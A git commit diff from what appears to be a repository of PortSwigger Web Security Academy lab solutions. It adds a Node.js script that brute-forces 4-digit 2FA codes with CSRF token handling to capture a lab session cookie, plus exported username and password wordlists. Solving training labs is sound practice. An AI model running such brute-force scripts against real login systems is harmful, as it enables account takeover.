df651b40140ab063b032176c3b970699549477ec
zS1L3NT Mac <zechariahtan144@gmail.com>
2023-11-03 03:15:27 +0800

    ✨ got the first lab to work in nodejs

--- src/base.ts
+++ src/base.ts
@@ -1,300 +1,302 @@
-;(async () => {
-	// #region Constants
-	const crypto = await import("crypto")
-	const USERNAMES = [
-		"carlos",
-		"root",
-		"admin",
-		"test",
-		"guest",
-		"info",
-		"adm",
-		"mysql",
-		"user",
-		"administrator",
-		"oracle",
-		"ftp",
-		"pi",
-		"puppet",
-		"ansible",
-		"ec2-user",
-		"vagrant",
-		"azureuser",
-		"academico",
-		"acceso",
-		"access",
-		"accounting",
-		"accounts",
-		"acid",
-		"activestat",
-		"ad",
-		"adam",
-		"adkit",
-		"admin",
-		"administracion",
-		"administrador",
-		"administrator",
-		"administrators",
-		"admins",
-		"ads",
-		"adserver",
-		"adsl",
-		"ae",
-		"af",
-		"affiliate",
-		"affiliates",
-		"afiliados",
-		"ag",
-		"agenda",
-		"agent",
-		"ai",
-		"aix",
-		"ajax",
-		"ak",
-		"akamai",
-		"al",
-		"alabama",
-		"alaska",
-		"albuquerque",
-		"alerts",
-		"alpha",
-		"alterwind",
-		"am",
-		"amarillo",
-		"americas",
-		"an",
-		"anaheim",
-		"analyzer",
-		"announce",
-		"announcements",
-		"antivirus",
-		"ao",
-		"ap",
-		"apache",
-		"apollo",
-		"app",
-		"app01",
-		"app1",
-		"apple",
-		"application",
-		"applications",
-		"apps",
-		"appserver",
-		"aq",
-		"ar",
-		"archie",
-		"arcsight",
-		"argentina",
-		"arizona",
-		"arkansas",
-		"arlington",
-		"as",
-		"as400",
-		"asia",
-		"asterix",
-		"at",
-		"athena",
-		"atlanta",
-		"atlas",
-		"att",
-		"au",
-		"auction",
-		"austin",
-		"auth",
-		"auto",
-		"autodiscover",
-	] as const
-	const PASSWORDS = [
-		"123456",
-		"password",
-		"12345678",
-		"qwerty",
-		"123456789",
-		"12345",
-		"1234",
-		"111111",
-		"1234567",
-		"dragon",
-		"123123",
-		"baseball",
-		"abc123",
-		"football",
-		"monkey",
-		"letmein",
-		"shadow",
-		"master",
-		"666666",
-		"qwertyuiop",
-		"123321",
-		"mustang",
-		"1234567890",
-		"michael",
-		"654321",
-		"superman",
-		"1qaz2wsx",
-		"7777777",
-		"121212",
-		"000000",
-		"qazwsx",
-		"123qwe",
-		"killer",
-		"trustno1",
-		"jordan",
-		"jennifer",
-		"zxcvbnm",
-		"asdfgh",
-		"hunter",
-		"buster",
-		"soccer",
-		"harley",
-		"batman",
-		"andrew",
-		"tigger",
-		"sunshine",
-		"iloveyou",
-		"2000",
-		"charlie",
-		"robert",
-		"thomas",
-		"hockey",
-		"ranger",
-		"daniel",
-		"starwars",
-		"klaster",
-		"112233",
-		"george",
-		"computer",
-		"michelle",
-		"jessica",
-		"pepper",
-		"1111",
-		"zxcvbn",
-		"555555",
-		"11111111",
-		"131313",
-		"freedom",
-		"777777",
-		"pass",
-		"maggie",
-		"159753",
-		"aaaaaa",
-		"ginger",
-		"princess",
-		"joshua",
-		"cheese",
-		"amanda",
-		"summer",
-		"love",
-		"ashley",
-		"nicole",
-		"chelsea",
-		"biteme",
-		"matthew",
-		"access",
-		"yankees",
-		"987654321",
-		"dallas",
-		"austin",
-		"thunder",
-		"taylor",
-		"matrix",
-		"mobilemail",
-		"mom",
-		"monitor",
-		"monitoring",
-		"montana",
-		"moon",
-		"moscow",
-	] as const
-	class Sess {
-		history = [] as Res[]
-		constructor(private cookies = [] as string[]) {}
+export const USERNAMES = [
+	"carlos",
+	"root",
+	"admin",
+	"test",
+	"guest",
+	"info",
+	"adm",
+	"mysql",
+	"user",
+	"administrator",
+	"oracle",
+	"ftp",
+	"pi",
+	"puppet",
+	"ansible",
+	"ec2-user",
+	"vagrant",
+	"azureuser",
+	"academico",
+	"acceso",
+	"access",
+	"accounting",
+	"accounts",
+	"acid",
+	"activestat",
+	"ad",
+	"adam",
+	"adkit",
+	"admin",
+	"administracion",
+	"administrador",
+	"administrator",
+	"administrators",
+	"admins",
+	"ads",
+	"adserver",
+	"adsl",
+	"ae",
+	"af",
+	"affiliate",
+	"affiliates",
+	"afiliados",
+	"ag",
+	"agenda",
+	"agent",
+	"ai",
+	"aix",
+	"ajax",
+	"ak",
+	"akamai",
+	"al",
+	"alabama",
+	"alaska",
+	"albuquerque",
+	"alerts",
+	"alpha",
+	"alterwind",
+	"am",
+	"amarillo",
+	"americas",
+	"an",
+	"anaheim",
+	"analyzer",
+	"announce",
+	"announcements",
+	"antivirus",
+	"ao",
+	"ap",
+	"apache",
+	"apollo",
+	"app",
+	"app01",
+	"app1",
+	"apple",
+	"application",
+	"applications",
+	"apps",
+	"appserver",
+	"aq",
+	"ar",
+	"archie",
+	"arcsight",
+	"argentina",
+	"arizona",
+	"arkansas",
+	"arlington",
+	"as",
+	"as400",
+	"asia",
+	"asterix",
+	"at",
+	"athena",
+	"atlanta",
+	"atlas",
+	"att",
+	"au",
+	"auction",
+	"austin",
+	"auth",
+	"auto",
+	"autodiscover",
+] as const
 
-		static async req(request: string) {
-			return new Sess().req(request)
-		}
+export const PASSWORDS = [
+	"123456",
+	"password",
+	"12345678",
+	"qwerty",
+	"123456789",
+	"12345",
+	"1234",
+	"111111",
+	"1234567",
+	"dragon",
+	"123123",
+	"baseball",
+	"abc123",
+	"football",
+	"monkey",
+	"letmein",
+	"shadow",
+	"master",
+	"666666",
+	"qwertyuiop",
+	"123321",
+	"mustang",
+	"1234567890",
+	"michael",
+	"654321",
+	"superman",
+	"1qaz2wsx",
+	"7777777",
+	"121212",
+	"000000",
+	"qazwsx",
+	"123qwe",
+	"killer",
+	"trustno1",
+	"jordan",
+	"jennifer",
+	"zxcvbnm",
+	"asdfgh",
+	"hunter",
+	"buster",
+	"soccer",
+	"harley",
+	"batman",
+	"andrew",
+	"tigger",
+	"sunshine",
+	"iloveyou",
+	"2000",
+	"charlie",
+	"robert",
+	"thomas",
+	"hockey",
+	"ranger",
+	"daniel",
+	"starwars",
+	"klaster",
+	"112233",
+	"george",
+	"computer",
+	"michelle",
+	"jessica",
+	"pepper",
+	"1111",
+	"zxcvbn",
+	"555555",
+	"11111111",
+	"131313",
+	"freedom",
+	"777777",
+	"pass",
+	"maggie",
+	"159753",
+	"aaaaaa",
+	"ginger",
+	"princess",
+	"joshua",
+	"cheese",
+	"amanda",
+	"summer",
+	"love",
+	"ashley",
+	"nicole",
+	"chelsea",
+	"biteme",
+	"matthew",
+	"access",
+	"yankees",
+	"987654321",
+	"dallas",
+	"austin",
+	"thunder",
+	"taylor",
+	"matrix",
+	"mobilemail",
+	"mom",
+	"monitor",
+	"monitoring",
+	"montana",
+	"moon",
+	"moscow",
+] as const
 
-		async req(request: string) {
-			const lines = request.trim().split("\n")
-			if (!lines.length) throw new Error("Empty request string!")
+export class Sess {
+	history = [] as Res[]
+	constructor(private cookies = [] as string[]) {}
 
-			const [method, url] = lines.shift()!.trim().split(" ")
-
-			let i = 0
-			const headers = {} as Record<string, string>
-			for (; i < lines.length; i++) {
-				const line = lines[i]!.trim()
-				if (!line) break
-
-				const [key, ...values] = line.split(":")
-				headers[key!] = values.join(":").trim()
-			}
-
-			if ("Cookie" in headers) {
-				headers.Cookie = [...this.cookies, headers.Cookie].join("; ")
-			} else if ("cookie" in headers) {
-				headers.cookie = [...this.cookies, headers.cookie].join("; ")
-			} else {
-				headers.Cookie = this.cookies.join("; ")
-			}
-
-			let body = lines
-				.slice(++i)
-				.map(l => l.trim())
-				.join("\n")
-				.trim()
-
-			const req = await fetch(url!, {
-				method,
-				headers,
-				body: method!.toLowerCase() === "get" ? undefined : body,
-			})
-
-			const res = new Res(req, await req.text())
-
-			this.history.push(res)
-			this.cookies.push(...res.cookies())
-
-			return res
-		}
+	static async req(request: string) {
+		return new Sess().req(request)
 	}
-	class Res {
-		constructor(
-			private res: Response,
-			private text: string,
-		) {}
 
-		get raw() {
-			return this.res
+	async req(request: string) {
+		const lines = request.trim().split("\n")
+		if (!lines.length) throw new Error("Empty request string!")
+
+		const [method, url] = lines.shift()!.trim().split(" ")
+
+		let i = 0
+		const headers = {} as Record<string, string>
+		for (; i < lines.length; i++) {
+			const line = lines[i]!.trim()
+			if (!line) break
+
+			const [key, ...values] = line.split(":")
+			headers[key!] = values.join(":").trim()
 		}
 
-		status() {
-			return this.res.status
+		if ("Cookie" in headers) {
+			headers.Cookie = [...this.cookies, headers.Cookie].join("; ")
+		} else if ("cookie" in headers) {
+			headers.cookie = [...this.cookies, headers.cookie].join("; ")
+		} else {
+			headers.Cookie = this.cookies.join("; ")
 		}
 
-		headers() {
-			return this.res.headers
-		}
+		let body = lines
+			.slice(++i)
+			.map(l => l.trim())
+			.join("\n")
+			.trim()
 
-		header(key: string): string | string[] | undefined {
-			return [...this.res.headers.entries()].find(
-				([k]) => k.toLowerCase() === key.toLowerCase(),
-			)?.[1]
-		}
+		const req = await fetch(url!, {
+			method,
+			headers,
+			body: method!.toLowerCase() === "get" ? undefined : body,
+			redirect: "manual",
+		})
 
-		cookies(): string[] {
-			return [this.header("set-cookie")!].flat()?.map(c => c.split(";")[0]!) ?? []
-		}
+		const res = new Res(req, await req.text())
 
-		body() {
-			return this.text
-		}
+		this.history.push(res)
+		this.cookies.push(...res.cookies())
 
-		bodreg(regexp: RegExp) {
-			return this.text.match(regexp)?.slice(1)
-		}
+		return res
 	}
-	// #endregion
+}
 
-	console.clear()
-})()
+export class Res {
+	constructor(
+		private res: Response,
+		private text: string,
+	) {}
+
+	get raw() {
+		return this.res
+	}
+
+	status() {
+		return this.res.status
+	}
+
+	headers() {
+		return this.res.headers
+	}
+
+	header(key: string): string | string[] | undefined {
+		return [...this.res.headers.entries()].find(
+			([k]) => k.toLowerCase() === key.toLowerCase(),
+		)?.[1]
+	}
+
+	cookies(): string[] {
+		return (
+			[this.header("set-cookie")!]
+				.flat()
+				.filter(Boolean)
+				.map(c => c.split(";")[0]!) ?? []
+		)
+	}
+
+	body() {
+		return this.text
+	}
+
+	bodreg(regexp: RegExp) {
+		return this.text.match(regexp)?.slice(1)
+	}
+}
--- src/solutions/lab-2fa-bypass-using-a-brute-force-attack.ts
+++ src/solutions/lab-2fa-bypass-using-a-brute-force-attack.ts
@@ -1,119 +1,30 @@
 /**
  * PortSwigger Lab: 2FA bypass using a brute-force attack
  * https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
- * 
- * Runs only in Browsers
  */
 
-;(async () => {
-	// #region classes
-	class Sess {
-		history = [] as Res[]
-		constructor(private cookies = [] as string[]) {}
+import { Sess } from "../base"
 
-		req = async (request: string) => {
-			const lines = request.trim().split("\n")
-			if (!lines.length) throw new Error("Empty request string!")
+const iter = async (mfa1: number, mfa2: number) => {
+	const sess = new Sess()
+	const csrf1 = await sess
+		.req(
+			`
+					GET https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login HTTP/1.1
+					Upgrade-Insecure-Requests: 1
+					Sec-Fetch-Dest: document
+					Sec-Fetch-Mode: navigate
+					Sec-Fetch-Site: same-origin
+					Sec-Fetch-User: ?1
+				`,
+		)
+		.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
 
-			const [method, url] = lines.shift()!.trim().split(" ")
-
-			let i = 0
-			const headers = {} as Record<string, string>
-			for (; i < lines.length; i++) {
-				const line = lines[i]!.trim()
-				if (!line) break
-
-				const [key, ...values] = line.split(":")
-				headers[key!] = values.join(":").trim()
-			}
-
-			if ("Cookie" in headers) {
-				headers.Cookie = [...this.cookies, headers.Cookie].join("; ")
-			} else if ("cookie" in headers) {
-				headers.cookie = [...this.cookies, headers.cookie].join("; ")
-			} else {
-				headers.Cookie = this.cookies.join("; ")
-			}
-
-			let body = lines
-				.slice(++i)
-				.map(l => l.trim())
-				.join("\n")
-				.trim()
-
-			const req = await fetch(url!, {
-				method,
-				headers,
-				body: method!.toLowerCase() === "get" ? undefined : body,
-			})
-
-			const res = new Res(req, await req.text())
-
-			this.history.push(res)
-			this.cookies.push(...res.cookies())
-
-			return res
-		}
-	}
-
-	class Res {
-		constructor(
-			private res: Response,
-			private text: string,
-		) {}
-
-		get raw() {
-			return this.res
-		}
-
-		status() {
-			return this.res.status
-		}
-
-		headers() {
-			return this.res.headers
-		}
-
-		header(key: string): string | string[] | undefined {
-			return [...this.res.headers.entries()].find(
-				([k]) => k.toLowerCase() === key.toLowerCase(),
-			)?.[1]
-		}
-
-		cookies(): string[] {
-			return (this.header("set-cookie") as string[])?.map(c => c.split(";")[0]!) ?? []
-		}
-
-		body() {
-			return this.text
-		}
-
-		bodreg(regexp: RegExp) {
-			return this.text.match(regexp)?.slice(1)
-		}
-	}
-	// #endregion
-
-	console.clear()
-
-	const iter = async (mfa1: number, mfa2: number) => {
-		const sess = new Sess()
-		const r1 = await sess.req(`
-			GET https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login HTTP/1.1
-			Upgrade-Insecure-Requests: 1
-			Sec-Fetch-Dest: document
-			Sec-Fetch-Mode: navigate
-			Sec-Fetch-Site: same-origin
-			Sec-Fetch-User: ?1
-		`)
-
-		const csrf1 = r1.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0]
-
-		const r2 = await sess.req(`
-			POST https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login HTTP/1.1
+	await sess.req(`
+			POST https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login HTTP/1.1
 			Content-Type: application/x-www-form-urlencoded
 			Content-Length: 70
-			Origin: https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net
+			Origin: https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net
 			Upgrade-Insecure-Requests: 1
 			Sec-Fetch-Dest: document
 			Sec-Fetch-Mode: navigate
@@ -123,14 +34,24 @@
 			csrf=${csrf1}&username=carlos&password=montoya
 		`)
 
-		const csrf2 = r2.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0]
+	const csrf2 = await sess
+		.req(
+			`
+					GET https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login2 HTTP/1.1
+					Upgrade-Insecure-Requests: 1
+					Sec-Fetch-Dest: document
+					Sec-Fetch-Mode: navigate
+					Sec-Fetch-Site: same-origin
+					Sec-Fetch-User: ?1
+				`,
+		)
+		.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
 
-		const r3 = await sess.req(`
-			POST https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login2 HTTP/1.1
+	const r3 = await sess.req(`
+			POST https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login2 HTTP/1.1
 			Content-Type: application/x-www-form-urlencoded
 			Content-Length: 51
-			Origin: https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net
-			Upgrade-Insecure-Requests: 1
+			Origin: https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net
 			Sec-Fetch-Dest: document
 			Sec-Fetch-Mode: navigate
 			Sec-Fetch-Site: same-origin
@@ -139,18 +60,18 @@
 			csrf=${csrf2}&mfa-code=${(mfa1 + "").padStart(4, "0")}
 		`)
 
-		if (r3.status() === 302) {
-			console.log("COOKIE ATTAINED:", r3.cookies())
-			return true
-		} else {
-			console.log("MFA FAILED: ", mfa1)
-		}
+	if (r3.status() === 302) {
+		console.log("MFA SUCCESS:", r3.cookies())
+		return true
+	} else {
+		console.log("MFA FAILED: ", mfa1)
+	}
 
-		const r4 = await sess.req(`
-			POST https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login2 HTTP/1.1
+	const r4 = await sess.req(`
+			POST https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login2 HTTP/1.1
 			Content-Type: application/x-www-form-urlencoded
 			Content-Length: 51
-			Origin: https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net
+			Origin: https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net
 			Upgrade-Insecure-Requests: 1
 			Sec-Fetch-Dest: document
 			Sec-Fetch-Mode: navigate
@@ -160,19 +81,18 @@
 			csrf=${csrf2}&mfa-code=${(mfa2 + "").padStart(4, "0")}
 		`)
 
-		if (r4.status() === 302) {
-			console.log("COOKIE ATTAINED:", r4.cookies())
-			return true
-		} else {
-			console.log("MFA FAILED: ", mfa2)
-		}
-
-		return false
+	if (r4.status() === 302) {
+		console.log("MFA SUCCESS:", r4.cookies())
+		return true
+	} else {
+		console.log("MFA FAILED: ", mfa2)
 	}
 
-	for (let i = 0; i < 9999; i++) {
-		if (await iter(i, ++i)) {
-			break
-		}
+	return false
+}
+
+for (let i = 0; i < 9999; i++) {
+	if (await iter(i, ++i)) {
+		break
 	}
-})()
+}
